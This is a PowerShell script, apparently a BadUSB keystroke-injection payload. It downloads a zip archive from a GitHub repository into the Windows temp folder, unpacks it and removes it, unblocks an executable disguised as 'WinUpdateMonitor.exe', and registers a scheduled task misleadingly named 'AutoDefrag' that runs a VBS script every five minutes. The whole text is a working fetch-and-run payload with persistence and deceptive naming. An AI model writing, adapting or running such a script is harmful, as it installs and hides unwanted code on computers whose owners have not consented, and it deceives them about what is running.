cd $env:Temp;

iwr -Uri https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v3/cAps-TroLl-v3.zip -O 258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip;
Start-Sleep 1;
Expand-Archive -Path 258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip -DestinationPath "$env:Temp"
Start-Sleep 1;
Remove-Item -Path $env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166.zip -Force
Start-Sleep 1;
Unblock-File -Path "$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\WinUpdateMonitor.exe"
Start-Sleep 1;
schtasks /create /tn "AutoDefrag" /tr "wscript.exe `"$env:Temp\258A2F13-D6F4-4CC9-A250-BD4CF37E9166\managed.vbs"`" /sc MINUTE /mo 5 /ru "$env:USERNAME" /f;
schtasks /run /tn "AutoDefrag"
exit
